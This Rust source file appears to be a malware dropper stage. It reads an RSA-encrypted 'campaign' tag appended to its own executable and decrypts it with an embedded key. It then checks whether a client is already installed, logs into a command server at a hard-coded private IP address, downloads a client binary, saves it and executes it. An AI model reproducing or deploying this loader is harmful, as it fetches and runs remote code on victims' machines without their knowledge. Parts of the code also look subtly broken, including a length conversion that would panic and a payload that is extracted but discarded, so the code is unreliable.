use reqwest::StatusCode;
use serde::{Deserialize, Serialize};
use sha2::digest::Reset;
use sha2::{Digest, Sha256, Sha512};
use shared::{api::*, challenge::Challenge, utils, error::*};
use std::fs;
use std::fs::{read, File};
use std::io::Write;
use std::mem::swap;
use std::str::FromStr;
use std::process::Command;
use std::path::Path;
use std::env::current_exe;
use std::convert::TryInto;
use rsa::PaddingScheme;

fn find3(haystack: &Vec<u8>, needle: &Vec<u8>) -> Option<usize> {
    (0..haystack.len()-needle.len()+1)
        .filter(|&i| haystack[i..i+needle.len()] == needle[..]).next()
}

fn should_run() -> bool {

    // already downloaded client?
    for name in vec!(utils::NAME1.to_string(), utils::NAME2.to_string()).iter() {
        if Path::new(&name).exists() {
            return false;
        }
    }

    true
}

fn payload() -> Result<Option<Vec<u8>>> {
    let bytes = read(current_exe()?)?;
    let mut sequence = shared::PREFIX.as_bytes().to_vec();
    sequence.append(&mut vec!(0, 0, 0, 0, 0, 0));

    if let Some(index) = find3(&bytes, &sequence) {
        let mut data = bytes[index+shared::PREFIX.as_bytes().len()..].to_vec();
        let length = i64::from_be_bytes(data.clone().try_into().unwrap()) as usize;

        // read encrypted campaign
        let ciphertext = data[8..8+length].to_vec();

        // decrypt campaign
        let padding = PaddingScheme::new_pkcs1v15_encrypt();
        let campaign = String::from_utf8(utils::KEY.decrypt(padding, &ciphertext)?)?;

        // extract payload
        let payload_bytes = data[8+length..].to_vec();

        println!("campaign: {}, length: {}", campaign, payload_bytes.len());
    }


    Ok(None)
}

fn main() {
    payload().unwrap();

    utils::chdir();

    // check if we should continue?
    if !should_run() {
        return;
    }

    let mut api_client = Api::new("10.211.55.2", 8000, false);
    api_client.login(&SystemInfo {
        cpu_total: 0.0,
        mem_total: 0.0
    }).unwrap();

    let upload = api_client.client_download().unwrap();
    let path = utils::save(upload).unwrap();

    // run program!
    Command::new(path).spawn().unwrap();
}
